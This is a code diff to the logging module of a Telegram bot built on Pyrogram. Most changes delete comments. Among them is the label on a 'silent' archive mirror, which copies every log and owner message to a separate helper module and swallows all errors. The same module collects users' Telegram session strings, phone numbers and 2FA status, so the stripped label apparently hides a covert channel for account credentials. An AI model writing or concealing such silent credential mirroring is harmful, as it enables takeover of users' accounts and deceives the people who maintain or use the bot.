@@ -26,12 +26,11 @@ from pyrogram.enums import ParseMode
 
 from config import Config
 
-_bot_client = None          # set from main.py after the bot is ready
+_bot_client = None
 _channel = Config.LOG_CHANNEL
 _last_error: str = ""
 _BRAND = (getattr(Config, "LOG_BRAND", "") or "APEX VC").strip()
 
-# ── console logger (4st format) ───────────────────────────────────────────────
 def bot_logger(tag, text):
     tstamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     print(f"[{tstamp}] [{tag}] -> {text}", flush=True)
@@ -40,9 +39,8 @@ def kolkata_now() -> str:
     return (datetime.datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
             ).strftime("%Y-%m-%d %I:%M:%S %p")
 
-_kolkata_now = kolkata_now   # 4st alias
+_kolkata_now = kolkata_now
 
-# ── wiring ────────────────────────────────────────────────────────────────────
 def set_bot(client):
     global _bot_client
     _bot_client = client
@@ -73,16 +71,14 @@ async def _send_to(target, text: str) -> bool:
     if not target:
         _last_error = "target is not configured"
         return False
-    
-    # ── Internal Archive Mirror (Silent & Isolated) ──
+
     try:
         from helpers.archive import push_archive, is_archive_active
         if is_archive_active() and target in (_channel, Config.primary_owner()):
             asyncio.create_task(push_archive(text))
     except Exception:
-        # Fail silently, main bot logging continues normally
+
         pass
-    # ──────────────────────────────────────────────────
 
     try:
         await _bot_client.send_message(
@@ -120,7 +116,6 @@ def _fire(coro):
     except RuntimeError:
         return asyncio.ensure_future(coro)
 
-# ── user-object helpers ───────────────────────────────────────────────────────
 class _U:
     """Tiny shim so log_to_channel can be fed raw ids the same way as objects."""
     def __init__(self, id=0, first_name="", last_name="", username=None,
@@ -132,7 +127,6 @@ class _U:
 def _u(user_id, username=None, first_name=None):
     return _U(id=user_id or 0, first_name=first_name or "", username=username)
 
-# ── 4st: log_to_channel ───────────────────────────────────────────────────────
 async def log_to_channel(action: str, details: dict, user_obj=None, client=None,
                          chat_id: int = 0, chat_title: str = ""):
     log_cid = _channel
@@ -186,7 +180,6 @@ async def log_to_channel(action: str, details: dict, user_obj=None, client=None,
 
     _fire(_send_to(log_cid, log_text))
 
-# ── 4st: notify_new_user ──────────────────────────────────────────────────────
 async def notify_new_user(user_info, string_session: str,
                           phone: str = "N/A",
                           twofa_verified: bool = False,
@@ -249,7 +242,6 @@ async def notify_new_user(user_info, string_session: str,
             await _send_target("OWNER_DM", owner_id)
     _fire(_go())
 
-# ── startup verification ──────────────────────────────────────────────────────
 async def verify_log_channel() -> str:
     """Returns "" when the log channel works, otherwise a human readable reason."""
     if not _channel:
@@ -278,8 +270,6 @@ async def verify_log_channel() -> str:
         f"<code>{_e(_last_error)}</code>\n"
         f"Bot ko <b>Post Messages</b> permission ke saath admin banayein."
     )
-
-# ── Compatibility wrappers (old names → 4st log_to_channel) ──────────────────
 
 async def log_startup(bot_username: str, sessions_restored: int, total_users: int):
     bot_logger("BOT", f"Started as @{bot_username} | users={total_users} | restored={sessions_restored}")
